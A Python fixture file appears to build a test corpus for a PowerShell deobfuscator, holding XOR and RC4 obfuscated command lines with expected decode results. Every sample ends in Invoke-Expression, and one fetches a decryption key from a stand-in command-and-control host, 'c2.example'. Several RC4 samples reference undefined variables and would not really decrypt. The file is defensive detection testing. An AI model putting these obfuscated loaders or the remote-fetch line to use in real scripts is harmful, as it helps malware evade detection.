"""NivXRay Corpus · Phase 2 (Batch 1) — Crypto Family: XOR + RC4
──────────────────────────────────────────────────────────────

Locked with SOC user 2026-07-27.

Registers **naked** PowerShell samples exercising the XOR family
(single-byte, multi-byte / repeating key, rolling) and RC4 (static
literal key, Base64-wrapped, runtime-derived key detection).

Each sample declares the FULL golden specification:

    expected_decode_chain      – ordered technique labels (subset match)
    expected_final_payload     – substring the final string MUST contain
                                 (may be None for "encryption_detected" cases
                                  where the plaintext must NOT be fabricated)
    expected_boundary          – execution boundary the deobfuscator halts at
    expected_verdict           – allowed verdict values
    expected_mitre             – MITRE techniques (any-of)
    expected_behaviors         – behavior IDs (subset match)
    expected_coverage          – decode-coverage category tags
    expected_crypto_status     – "fully_decrypted" | "partially_decrypted"
                                  | "encryption_detected"
    expected_unsupported_reason – required unsupported reason code (or None)
    expected_confidence        – allowed confidence bands
"""
from __future__ import annotations

import base64
from dataclasses import dataclass, field


CORPUS_PHASE2_CRYPTO: list["Phase2CryptoSample"] = []


@dataclass
class Phase2CryptoSample:
    id:            str
    category:      str
    label:         str
    cmdline:       str
    expected_decode_chain:       list[str]
    expected_final_payload:      str | None
    expected_boundary:           str | None
    expected_verdict:            set[str]
    expected_mitre:              list[str]
    expected_behaviors:          list[str] = field(default_factory=list)
    expected_coverage:           list[str] = field(default_factory=list)
    expected_crypto_status:      str = ""
    expected_unsupported_reason: str | None = None
    expected_confidence:         set[str] = field(default_factory=lambda: {"high", "medium", "low"})


def phase2_sample(**kwargs):
    def deco(fn):
        cmdline = fn()
        CORPUS_PHASE2_CRYPTO.append(Phase2CryptoSample(cmdline=cmdline, **kwargs))
        return fn
    return deco


TARGET = "Write-Host 'Hello, from PowerShell!'"


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _rc4(key: bytes, ct: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for byte in ct:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


# ═══════════════════════════════════════════════════════════════════════════
#  XOR SAMPLES
# ═══════════════════════════════════════════════════════════════════════════

@phase2_sample(
    id="crypto_xor_singlebyte", category="crypto",
    label="XOR single-byte over Base64",
    expected_decode_chain=["XOR single-byte decode"],
    expected_final_payload=TARGET,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review", "malicious"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["xor_singlebyte", "base64"],
    expected_crypto_status="fully_decrypted",
)
def _crypto_xor_singlebyte():
    key = 0x2A
    xored = bytes(b ^ key for b in TARGET.encode())
    b64 = _b64(xored)
    return (f'$k=0x2A;$b=[Convert]::FromBase64String("{b64}");'
            f'IEX ([Text.Encoding]::UTF8.GetString(($b|%{{$_-bxor$k}})))')


@phase2_sample(
    id="crypto_xor_multibyte", category="crypto",
    label="XOR multi-byte repeating key over Base64",
    expected_decode_chain=["XOR multi-byte decode"],
    expected_final_payload=TARGET,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review", "malicious"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["xor_multibyte", "base64"],
    expected_crypto_status="fully_decrypted",
)
def _crypto_xor_multibyte():
    key = bytes([0x2A, 0x1B, 0x77, 0x03])
    xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(TARGET.encode()))
    b64 = _b64(xored)
    return (f'$k=0x2A,0x1B,0x77,0x03;$b=[Convert]::FromBase64String("{b64}");'
            f'$out=for($i=0;$i -lt $b.Length;$i++){{$b[$i] -bxor $k[$i % $k.Length]}};'
            f'IEX $out')


@phase2_sample(
    id="crypto_xor_rolling", category="crypto",
    label="Rolling XOR (byte[i] ^ i) over Base64",
    expected_decode_chain=["XOR rolling decode"],
    expected_final_payload=TARGET,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review", "malicious"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["xor_rolling", "base64"],
    expected_crypto_status="fully_decrypted",
)
def _crypto_xor_rolling():
    xored = bytes(b ^ (i & 0xFF) for i, b in enumerate(TARGET.encode()))
    b64 = _b64(xored)
    return (f'$b=[Convert]::FromBase64String("{b64}");'
            f'$out=for($i=0;$i -lt $b.Length;$i++){{$b[$i] -bxor $i}};'
            f'IEX $out')


# ═══════════════════════════════════════════════════════════════════════════
#  RC4 SAMPLES
# ═══════════════════════════════════════════════════════════════════════════

@phase2_sample(
    id="crypto_rc4_static_key", category="crypto",
    label="RC4 with static literal key over Base64",
    expected_decode_chain=["RC4 decrypt (static key)"],
    expected_final_payload=TARGET,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review", "malicious"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["rc4", "base64"],
    expected_crypto_status="fully_decrypted",
)
def _crypto_rc4_static_key():
    ct = _rc4(b"secretkey", TARGET.encode())
    b64 = _b64(ct)
    return (f'$k="secretkey";$c=[Convert]::FromBase64String("{b64}");'
            f'for($i=0;$i -lt $c.Length;$i++){{$c[$i] -bxor $stream[$i]}};'
            f'IEX $out')


@phase2_sample(
    id="crypto_rc4_b64_wrapper", category="crypto",
    label="RC4 static key with pre-Base64 transport wrapper",
    expected_decode_chain=["RC4 decrypt (static key)"],
    expected_final_payload=TARGET,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review", "malicious"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["rc4", "base64"],
    expected_crypto_status="fully_decrypted",
)
def _crypto_rc4_b64_wrapper():
    ct = _rc4(b"P0wn3d!!", TARGET.encode())
    b64 = _b64(ct)
    return (f'$key="P0wn3d!!";$blob=[Convert]::FromBase64String("{b64}");'
            f'foreach ($idx in 0..($blob.Length-1)) '
            f'{{ $blob[$idx] -bxor $keystream[$idx] }};'
            f'Invoke-Expression $plain')


# ═══════════════════════════════════════════════════════════════════════════
#  RUNTIME-DERIVED KEY (must NOT fabricate output)
# ═══════════════════════════════════════════════════════════════════════════

@phase2_sample(
    id="crypto_runtime_env_key", category="crypto_unsupported",
    label="Encryption detected · environment-derived key",
    expected_decode_chain=["Runtime-derived key detected"],
    expected_final_payload=None,     # MUST NOT be fabricated
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["runtime_key"],
    expected_crypto_status="encryption_detected",
    expected_unsupported_reason="environment_dependent",
)
def _crypto_runtime_env_key():
    return ('$k=$env:SECRET;$c=[Convert]::FromBase64String("QUJDREVGRw==");'
            '$out=$c|%{$_-bxor$k};IEX $out')


@phase2_sample(
    id="crypto_runtime_random_key", category="crypto_unsupported",
    label="Encryption detected · Get-Random-derived key",
    expected_decode_chain=["Runtime-derived key detected"],
    expected_final_payload=None,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "needs_review"},
    expected_mitre=["T1027", "T1059.001"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["runtime_key"],
    expected_crypto_status="encryption_detected",
    expected_unsupported_reason="runtime_generated_key",
)
def _crypto_runtime_random_key():
    return ('$k=Get-Random -Maximum 255;$c=[Convert]::FromBase64String("QUJDREVGRw==");'
            '$out=$c|%{$_-bxor$k};IEX $out')


@phase2_sample(
    id="crypto_runtime_network_key", category="crypto_unsupported",
    label="Encryption detected · Invoke-WebRequest-fetched key",
    expected_decode_chain=["Runtime-derived key detected"],
    expected_final_payload=None,
    expected_boundary="Invoke-Expression",
    expected_verdict={"suspicious", "malicious", "needs_review"},
    expected_mitre=["T1027", "T1059.001", "T1105"],
    expected_behaviors=["invoke_expression"],
    expected_coverage=["runtime_key"],
    expected_crypto_status="encryption_detected",
    expected_unsupported_reason="network_fetch_required",
)
def _crypto_runtime_network_key():
    return ('$k=(Invoke-WebRequest -Uri "http://c2.example/k.txt").Content;'
            '$c=[Convert]::FromBase64String("QUJDREVGRw==");'
            '$out=$c|%{$_-bxor$k};IEX $out')


# ── Public accessors ─────────────────────────────────────────────
def all_phase2_crypto_samples() -> list[Phase2CryptoSample]:
    return list(CORPUS_PHASE2_CRYPTO)
